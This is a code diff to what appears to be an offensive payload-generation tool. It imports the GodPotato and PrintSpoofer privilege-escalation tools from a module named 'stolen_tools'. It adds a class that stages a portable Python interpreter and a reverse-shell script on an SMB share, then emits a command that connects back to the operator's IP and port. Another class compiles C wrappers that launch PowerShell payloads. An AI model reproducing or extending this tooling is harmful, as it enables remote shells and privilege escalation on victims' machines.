@@ -1,6 +1,10 @@
+from io import BytesIO
+import os
 import subprocess
+import zipfile
 
-from stolen_tools.steal_tools import provide_godpotato, provide_printspoofer
+from stolen_tools.steal_tools import provide_godpotato, provide_printspoofer, provide_python_interpreter
+from silly_python_payloads import reverse_shell_file
 
 """Payloads take a file and wrap it into another file!! 
 EXCEPTION: PowershellFileRunner DOES NOT CREATE A POWERSHELL FILE!!
@@ -125,3 +129,16 @@ class CRunPowershellExe(Payload):
         self.payload += '");}'
         with subprocess.Popen([self.compiler, "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
             process.communicate(input=self.payload.encode())
+
+class SillyPythonPayload:
+    def __init__(self, smb_server_object, reverse_shell_port):
+        self.port = reverse_shell_port
+        self.smb_server = smb_server_object
+        with zipfile.ZipFile(BytesIO(provide_python_interpreter()), "r") as zipped:
+            zipped.extractall(smb_server_object.smb_dir)
+        self.interpreter = smb_server_object.create_temp_file_from_file(os.path.join(smb_server_object.smb_dir, "python.exe"))
+        self.reverse_shell = smb_server_object.create_temp_file_from_file(reverse_shell_file)
+
+
+    def __str__(self):
+        return f"{self.interpreter.remote_path_backslashes} -I {self.reverse_shell.remote_path_backslashes} {self.smb_server.local_ip} {self.port}"
